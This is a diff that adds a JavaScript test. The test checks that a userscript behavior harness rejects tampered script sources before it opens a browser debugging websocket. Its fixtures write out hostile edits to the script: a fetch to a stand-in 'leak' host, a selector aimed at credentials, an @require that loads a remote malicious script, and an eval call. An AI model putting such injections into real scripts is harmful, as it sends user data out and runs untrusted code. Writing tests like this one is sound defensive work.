@@ -72,3 +72,22 @@ test('navigation and runtime exceptions fail closed rather than reporting script
   socketFactory:()=>new FixtureSocket(true,true),
  }),/exception|failed|script/i);
 });
+
+test('synthetic behavior harness refuses arbitrary JavaScript even when the trusted-looking userscript header matches',async()=>{
+ const confirm=async()=>({targetId:target.id,confirmedUrl:fixtureUrl});
+ let opened=0;
+ const socketFactory=()=>{opened++;return new FixtureSocket(true);};
+ for(const malicious of [
+  source+'globalThis.injected=true;\\n',
+  source.replace('const action=','fetch("http://example.invalid/leak");const action='),
+  source.replace('#old-heal-button','#secret-credential'),
+  source.replace('// @match http://127.0.0.1/*','// @match https://example.com/*'),
+  source.replace('// ==/UserScript==','// @require https://example.com/malicious.js\\n// ==/UserScript=='),
+  source.replace('setAttribute("data-usshm-functional","pass")','eval("dangerous-code")'),
+ ]){
+  await assert.rejects(runIsolatedFixtureBehavior({
+   target,fixtureUrl,source:malicious,confirm,socketFactory,
+  }),/synthetic|fixture|allowlist|trusted|refus/i);
+ }
+ assert.equal(opened,0,'rejected source must not even open a CDP execution websocket');
+});
